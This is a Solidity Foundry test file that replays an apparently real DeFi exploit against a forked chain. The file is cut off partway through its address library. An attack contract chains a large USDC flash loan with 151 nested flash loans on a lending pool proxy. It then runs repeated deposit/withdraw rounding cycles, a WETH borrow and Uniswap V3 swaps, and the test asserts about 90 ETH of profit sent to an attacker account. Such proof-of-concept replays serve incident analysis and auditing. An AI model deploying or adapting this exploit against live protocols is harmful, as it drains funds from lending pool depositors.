
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 166405686;
    uint256 constant TX_TIMESTAMP = 1704221618;
    uint256 constant TX_BLOCK_NUMBER = 166405687;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 90053539750088189263);
    }
}

contract OurAttack {







    AttackerHelper public helper;

    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        IrUSDCn(Addresses.rUSDCn).UNDERLYING_ASSET_ADDRESS();
        IInitializableImmutableAdminUpgradeabilityProxy_794A61(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61
            )
            .flashLoan(
                address(this),
                _addressArray1(Addresses.USDC),
                _uintArray1(3000000000000),
                _uintArray1(0),
                address(this),
                hex"",
                uint16(0)
            );
        uint256 wethBalanceOfAttackAttackContract = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackAttackContract);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 0x4e1c52890632b844f) nativeTransferAmount = 0x4e1c52890632b844f;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
        IInitializableImmutableAdminUpgradeabilityProxy_0DF5DF(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_0DF5DF
            ).UNDERLYING_ASSET_ADDRESS();
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function _execOp() internal {
        _markCallback(1);
        _execOpCall();
        _execOpCall2();
        _execOpCall3();
        _execOpCall4();
        _execOpCall5();
        _execOpCall6();
        _execOpCall7();
        _execOpCall8();
    }

    function _execOpCall() internal {
        uint256 rUSDCnBalanceOfAttackAttackContract = IERC20Like(Addresses.rUSDCn).balanceOf(address(this));
        {
            IERC20Like(Addresses.USDC).transfer(Addresses.rUSDCn, rUSDCnBalanceOfAttackAttackContract);
        }
        IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
            ).withdraw(Addresses.USDC, 1999999999999, address(this));
    }

    function _execOpCall2() internal {}

    function _execOpCall3() internal {}

    function _execOpCall4() internal {}

    function _execOpCall5() internal {}

    function _execOpCall6() internal {}

    function _execOpCall7() internal {}

    function _execOpCall8() internal {}

    function _execOp2() internal {
        _markCallback(2);
        IrUSDCn(Addresses.rUSDCn).UNDERLYING_ASSET_ADDRESS();
        IERC20Like(Addresses.USDC)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148, type(uint256).max);
        uint256 depositLiveAmount = 2000000000000;
        IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
            ).deposit(Addresses.USDC, depositLiveAmount, address(this), uint16(0));
        {
            {
                for (uint256 i = 0; i < 151; i++) {
                    IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                            Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                        )
                        .flashLoan(
                            address(this),
                            _addressArray1(Addresses.USDC),
                            _uintArray1(2000000000000),
                            _uintArray1(0),
                            address(this),
                            hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                            uint16(0)
                        );
                }
            }
        }
        IERC20Like(Addresses.rUSDCn).balanceOf(address(this));
        IInitializableImmutableAdminUpgradeabilityProxy_0DF5DF(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_0DF5DF
            ).UNDERLYING_ASSET_ADDRESS();
        IERC20Like(Addresses.WETH).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_0DF5DF);
        IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
            ).getAddressesProvider();
        ILendingPoolAddressesProvider(Addresses.LendingPoolAddressesProvider).getPriceOracle();
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDC);
        IWETH(Addresses.WETH).decimals();
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.WETH);
        IUSDC(Addresses.USDC).decimals();
        IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
            ).getConfiguration(Addresses.USDC);
        IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
            ).borrow(Addresses.WETH, 90690695360221284999, 2, uint16(0), address(this));
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        IERC20Like(Addresses.USDC).approve(Addresses.attack_helper, type(uint256).max);
        AttackerHelper(payable(Addresses.attack_helper)).helperCb();
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
        uint256 wethApproveAllowance = 2000000000000000000;
        IERC20Like(Addresses.WETH).approve(Addresses.UniswapV3Pool, wethApproveAllowance);
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(address(this), true, int256(2000000000000000000), uint160(4295128740), hex"");
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 usdcApproveAllowance = 3232558736;
        IERC20Like(Addresses.USDC).approve(Addresses.UniswapV3Pool, usdcApproveAllowance);
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(
                address(this),
                false,
                int256(3232558736),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                hex""
            );
        uint256 usdcApproveAllowance_2 = 3001500000000;
        IERC20Like(Addresses.USDC)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, usdcApproveAllowance_2);
    }

    function _callback() internal {
        _markCallback(3);
        IUniswapV3Pool(Addresses.UniswapV3Pool).token1();
        uint256 transferLiveAmount = 3232558736;
        IERC20Like(Addresses.USDC).transfer(Addresses.UniswapV3Pool, transferLiveAmount);
    }

    function _callback2() internal {
        _markCallback(4);
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
        uint256 transferLiveAmount = 2000000000000000000;
        IERC20Like(Addresses.WETH).transfer(Addresses.UniswapV3Pool, transferLiveAmount);
    }

    function _attack2() internal {
        _markCallback(5);
    }

    receive() external payable {}

    function executeOperation(
        address[] calldata arg0,
        uint256[] calldata arg1,
        uint256[] calldata arg2,
        address arg3,
        bytes calldata arg4
    ) external payable returns (bool) {
        arg0;
        arg1;
        arg2;
        arg3;
        arg4;
        if (msg.sender == 0x794a61358D6845594F94dc1DB02A252b5b4814aD) {
            _execOp2();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1) {
            if (!_callbackSeen(1)) _execOp();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _execOp2();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
        return true;
    }

    fallback() external payable {
        if (msg.sig == 0x34ad3fac) {
            _attack();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0xfa461e33) {
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (msg.sender == 0xC6962004f452bE9203591991D15f6b388e09E8D0 && arg0 > 0 && arg0 < (1 << 255)) {
                    _callback2();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            {
                uint256 arg0;
                uint256 arg1;
                assembly {
                    arg0 := calldataload(4)
                    arg1 := calldataload(36)
                }
                if (msg.sender == 0xC6962004f452bE9203591991D15f6b388e09E8D0 && arg1 > 0 && arg1 < (1 << 255)) {
                    _callback();
                    bytes memory ret = hex"";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
            }
            _callback2();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _callbackSeen(uint256 index) internal view returns (bool) {
        return _callbackSeenFlag[index];
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }
}

contract AttackerHelper {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x2f2ed38b) {
            _helperCb();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function helperCb() external payable {
        _helperCb();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _callbackSeen(uint256 index) internal view returns (bool) {
        return _callbackSeenFlag[index];
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _helperCb() internal {
        {
            uint256 transferFromAmount = 543600000002;
            if (transferFromAmount != 0) {
                Harness.vmExt().startPrank(Addresses.attack_contract);
                IERC20Like(Addresses.USDC).transfer(Addresses.attack_helper, transferFromAmount);
                Harness.vmExt().stopPrank();
            }
        }
        IERC20Like(Addresses.USDC)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148, type(uint256).max);
        {
            uint256 depositLiveAmount = 543600000002;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                ).deposit(Addresses.USDC, depositLiveAmount, Addresses.attack_helper, uint16(0));
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                ).withdraw(Addresses.USDC, 407700000000, Addresses.attack_helper);
            uint256 depositActionGraphAmount = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                ).deposit(Addresses.USDC, depositActionGraphAmount, Addresses.attack_helper, uint16(0));
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_2 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_3 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_2,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_2 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_2,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_4 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_3,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_3 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_3,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_5 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_4,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_4 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_4,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_6 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_5,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_5 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_5,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_7 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_6,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_6 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_6,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_8 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_7,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_7 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_7,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_9 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_8,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_8 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_8,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_10 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_9,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_9 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_9,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_11 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_10,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_10 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_10,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_12 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_11,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_11 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_11,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_13 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_12,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_12 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_12,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_14 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_13,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_13 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_13,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_15 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_14,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_14 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_14,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_16 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_15,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_15 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_15,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_17 = IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_16,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_16 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_16,
                    Addresses.attack_helper,
                    uint16(0)
                );
            IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .withdraw(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148WithdrawUsdc_17,
                    Addresses.attack_helper
                );
            uint256 initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_17 = 271800000001;
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                )
                .deposit(
                    Addresses.USDC,
                    initializableImmutableAdminUpgradeabilityProxyF4b148DepositAmount_17,
                    Addresses.attack_helper,
                    uint16(0)
                );
            uint256 usdcBalanceOfRUSDCn = IERC20Like(Addresses.USDC).balanceOf(Addresses.rUSDCn);
            IInitializableImmutableAdminUpgradeabilityProxy_F4B148(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_F4B148
                ).withdraw(Addresses.USDC, usdcBalanceOfRUSDCn, Addresses.attack_helper);
        }
        uint256 usdcBalanceOfAttackHelper = IERC20Like(Addresses.USDC).balanceOf(Addresses.attack_helper);
        IERC20Like(Addresses.USDC).transfer(Addresses.attack_contract, usdcBalanceOfAttackHelper);
    }

    function _helper() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
